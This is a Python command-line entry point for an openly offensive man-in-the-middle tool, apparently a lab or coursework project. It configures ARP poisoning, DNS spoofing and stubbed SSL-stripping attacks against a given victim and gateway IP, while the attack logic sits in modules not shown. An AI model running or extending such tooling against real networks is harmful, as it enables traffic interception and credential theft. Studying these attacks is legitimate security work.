"""
Main entry point for the MITM attack tool.

Supports multiple attack modes:
- arp-only: ARP poisoning only
- dns-only: DNS spoofing (race attack)
- arp-dns: ARP poisoning + DNS spoofing (reliable MITM)
- arp-ssl: ARP poisoning + SSL stripping (stub)
- arp-dns-ssl: Complete attack (stub)

Usage:
    python main.py --mode arp-only --victim-ip 10.0.0.20 --target-ip 10.0.0.1
    python main.py --mode dns-only --victim-ip 10.0.0.20 --target-ip 10.0.0.1 --dns-rules dns_rules.json
    python main.py --mode arp-dns --victim-ip 10.0.0.20 --target-ip 10.0.0.1 --dns-rules dns_rules.json
"""

import sys
from pathlib import Path

import click

from attack_manager import AttackManager, AttackConfig, AttackMode
from network_utils import get_interface_info, load_dns_rules


# Available attack modes
ATTACK_MODES = ["arp-only", "dns-only", "arp-dns", "arp-ssl", "arp-dns-ssl"]


def validate_mode_requirements(mode: str, dns_rules_path: str | None) -> tuple[bool, str]:
    """Validate that required arguments are provided for the selected mode."""
    dns_modes = ["dns-only", "arp-dns", "arp-dns-ssl"]

    if mode in dns_modes and not dns_rules_path:
        return False, f"--dns-rules is required for {mode} mode"

    if dns_rules_path:
        path = Path(dns_rules_path)
        if not path.exists():
            return False, f"DNS rules file not found: {dns_rules_path}"

    return True, ""


@click.command()
@click.option(
    "--mode", "-m",
    type=click.Choice(ATTACK_MODES),
    default="arp-only",
    help="Attack mode to use.",
)
@click.option("--victim-ip", required=True, help="IP address of the victim.")
@click.option("--target-ip", required=True, help="IP address of the gateway/target to impersonate.")
@click.option("--interface", "-i", default=None, help="Network interface to use (default: auto-detect).")
@click.option("--dns-rules", "-d", type=click.Path(exists=False), default=None, help="Path to JSON file with DNS spoofing rules.")
@click.option("--silent", "-s", is_flag=True, default=False, help="Silent mode: listen for ARP requests instead of continuous poisoning (ARP only).")
def main(
    mode: str,
    victim_ip: str,
    target_ip: str,
    interface: str | None,
    dns_rules: str | None,
    silent: bool,
) -> None:
    """
    MITM Attack Tool - ARP Poisoning, DNS Spoofing, SSL Stripping.

    Examples:
        python main.py --mode arp-only --victim-ip 10.0.0.20 --target-ip 10.0.0.1
        python main.py --mode dns-only --victim-ip 10.0.0.20 --target-ip 10.0.0.1 -d dns_rules.json
        python main.py --mode arp-dns --victim-ip 10.0.0.20 --target-ip 10.0.0.1 -d dns_rules.json
    """

    # Validate mode requirements
    is_valid, error_msg = validate_mode_requirements(mode, dns_rules)
    if not is_valid:
        click.echo(click.style(f"[!] Error: {error_msg}", fg="red"))
        sys.exit(1)

    # Get interface and attacker IP
    try:
        iface, attacker_ip = get_interface_info(interface)
    except (OSError, RuntimeError, ValueError) as e:
        click.echo(click.style(f"[!] Failed to get interface info: {e}", fg="red"))
        sys.exit(1)

    click.echo(f"[+] Using interface: {iface} (IP: {attacker_ip})")
    click.echo(f"[+] Victim IP: {victim_ip}")
    click.echo(f"[+] Target IP: {target_ip}")

    # Load DNS rules if needed
    dns_rules_dict: dict[str, dict[str, str | None]] | None = None
    if dns_rules:
        try:
            dns_rules_dict = load_dns_rules(dns_rules)
            click.echo(f"[+] Loaded {len(dns_rules_dict)} DNS spoofing rules")
        except (FileNotFoundError, ValueError) as e:
            click.echo(click.style(f"[!] Failed to load DNS rules: {e}", fg="red"))
            sys.exit(1)

    # Create attack configuration
    config = AttackConfig(
        mode=AttackMode(mode),
        iface=iface,
        attacker_ip=attacker_ip,
        victim_ip=victim_ip,
        gateway_ip=target_ip,
        dns_rules=dns_rules_dict,
        silent=silent,
    )

    manager = AttackManager(config=config)

    try:
        manager.start()

        click.echo(click.style("\n[+] Attack is running!", fg="green", bold=True))
        click.echo("[+] Press Ctrl+C to stop and restore network state.\n")

        manager.wait()

    except KeyboardInterrupt:
        click.echo(click.style("\n[!] Keyboard interrupt received", fg="yellow"))

    except (RuntimeError, ValueError) as e:
        click.echo(click.style(f"\n[!] Error: {e}", fg="red"))

    finally:
        click.echo("\n[*] Cleaning up...")

        manager.stop()

        click.echo(click.style("[+] Clean exit.", fg="green"))


if __name__ == "__main__":
    main()  # pylint: disable=no-value-for-parameter
